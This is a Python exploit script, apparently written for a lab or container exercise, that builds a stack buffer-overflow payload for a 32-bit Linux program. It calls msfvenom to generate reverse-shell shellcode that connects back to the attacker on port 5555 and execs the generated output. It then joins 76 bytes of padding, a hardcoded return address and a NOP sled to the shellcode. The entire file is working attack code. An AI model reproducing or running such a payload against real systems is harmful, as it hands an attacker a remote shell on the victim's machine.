import struct
import os
import subprocess


def generate_shellcode():
    # Get the IP address of the attacker (this container)
    attacker_ip = os.environ.get('POD_IP', '127.0.0.1')

    # Generate shellcode using msfvenom
    try:
        cmd = f"msfvenom -p linux/x86/shell_reverse_tcp LHOST={attacker_ip} LPORT=5555 -f python -v shellcode"
        result = subprocess.run(cmd, shell=True, check=True, capture_output=True, text=True)
        exec(result.stdout)
        return shellcode
    except subprocess.CalledProcessError as e:
        print(f"Error generating shellcode: {e}")
        return None


def create_payload():
    shellcode = generate_shellcode()
    if not shellcode:
        return None

    padding = b"A" * 76
    ret = struct.pack("<I", 0xbffff7c0)  # This address might need to be adjusted

    payload = padding + ret + b"\x90" * 16 + shellcode
    return payload


if __name__ == "__main__":
    payload = create_payload()
    if payload:
        print(payload)
    else:
        print("Failed to create payload")
